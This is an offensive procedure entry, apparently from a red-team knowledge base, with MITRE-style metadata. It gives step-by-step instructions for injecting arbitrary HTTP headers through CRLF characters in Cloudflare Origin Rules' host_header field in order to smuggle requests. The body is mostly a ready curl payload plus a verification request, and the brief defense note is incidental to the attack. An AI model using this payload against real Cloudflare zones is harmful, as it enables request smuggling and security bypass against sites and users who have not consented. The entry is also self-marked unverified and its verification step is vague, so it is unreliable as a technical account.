---
tags:
  - http-request-smuggling
  - crlf-injection
  - cloudflare
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-crlf]]'
platforms:
  - Cloud (Cloudflare)
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: bc123830-8c5a-424f-bac6-e275a2461805
created_at: '2025-12-13T09:01:22.260Z'
updated_at: '2025-12-13T09:01:22.260Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject Arbitrary Headers Using CRLF in Origin Rules

## Summary

This procedure exploits the identified validation flaw by injecting arbitrary HTTP headers through CRLF characters in the host_header parameter, facilitating HTTP request smuggling in Cloudflare's Origin Rules.

## Description

Building on vulnerability confirmation, this step crafts a malicious API request to insert new header lines via CRLF, desynchronizing HTTP requests and allowing smuggling. It's targeted at Cloudflare environments and can lead to security bypasses.

## Requirements

1. Confirmed vulnerable API endpoint from prior step
2. Cloudflare API credentials
3. Ability to create Origin Rules

## Defense

Defensive measures and detection strategies:

- Sanitize all API inputs for special characters
- Use WAF rules to detect CRLF in headers

## Objectives

1. Inject malicious headers
2. Enable request smuggling
3. Prepare for bypass exploitation

## Instructions

### Step 1: Craft Injection Payload

**Context**: Prepare the payload with CRLF to inject headers.

Execute [[commands/curl-inject-crlf]]:

```bash
curl -X POST 'https://api.cloudflare.com/client/v4/zones/{zone_id}/origin_rules' \
  -H 'Authorization: Bearer {api_token}' \
  -H 'Content-Type: application/json' \
  --data '{"action_parameters": {"host_header": "example.com\r\nX-Injected-Header: malicious-value"}}'
```

> This injects the arbitrary header.

### Step 2: Verify Injection

**Context**: Send a test request to confirm smuggling.

Use a follow-up curl to observe injected headers in response.

```bash
curl 'https://target.cloudflare-managed-domain.com/'
```

> Look for the injected header in the smuggled request.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-inject-crlf]]

## Tools Used

- [[tools/curl]]

## Tags

- [[http-request-smuggling]]
- [[crlf-injection]]
